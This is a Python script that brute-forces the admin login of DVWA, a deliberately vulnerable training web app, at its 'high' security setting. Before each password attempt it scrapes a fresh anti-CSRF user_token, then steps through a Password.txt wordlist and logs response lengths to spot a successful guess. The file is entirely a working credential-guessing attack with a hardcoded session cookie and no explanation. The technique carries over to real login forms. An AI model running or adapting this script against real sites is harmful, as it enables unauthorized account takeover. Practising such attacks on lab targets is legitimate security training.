import requests
from bs4 import BeautifulSoup
import time


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Referer': 'http://[IP Address Or Domain]/DVWA-master/vulnerabilities/brute/',
    'Cookie': 'PHPSESSID=ngtpkpd10u06vffnfldqn9ci7m; security=high',
    'Upgrade-Insecure-Requests': '1'
}
url = "http://[IP Address Or Domain]/DVWA-master/vulnerabilities/brute/"


def get_token():
    response = requests.get(url=url, headers=headers)
    html = response.content.decode()
    temp = BeautifulSoup(html, "html.parser")
    user_token = temp.select('input[name="user_token"]')[0]['value']
    return user_token


def main():
    user_token = get_token()
    i = 0
    for line in open("Password.txt", "r"):
        url = "http://[IP Address Or Domain]/DVWA-master/vulnerabilities/brute/" + "?username=admin&password=" + line.strip() + \
            "&Login=Login&user_token=" + user_token
        response = requests.get(url, headers=headers)
        res_len = len(response.content)
        i = i + 1
        print("[*] " + str(i) + " Password: " + line.strip() + " Response Length: " + str(res_len))
        user_token = get_token()
        time.sleep(1)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()


